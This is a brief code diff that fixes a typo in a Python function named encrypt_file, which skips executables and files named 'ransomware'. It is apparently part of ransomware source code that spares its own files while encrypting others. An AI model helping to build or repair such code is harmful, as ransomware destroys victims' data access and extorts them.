@@ -15,7 +15,7 @@ def encrypt_file(filename):
     # skip over exe files
     if filename.endswith(".exe"):
         return
-    if filename.starswith("ransomware"):
+    if filename.startswith("ransomware"):
         return
 
     try:
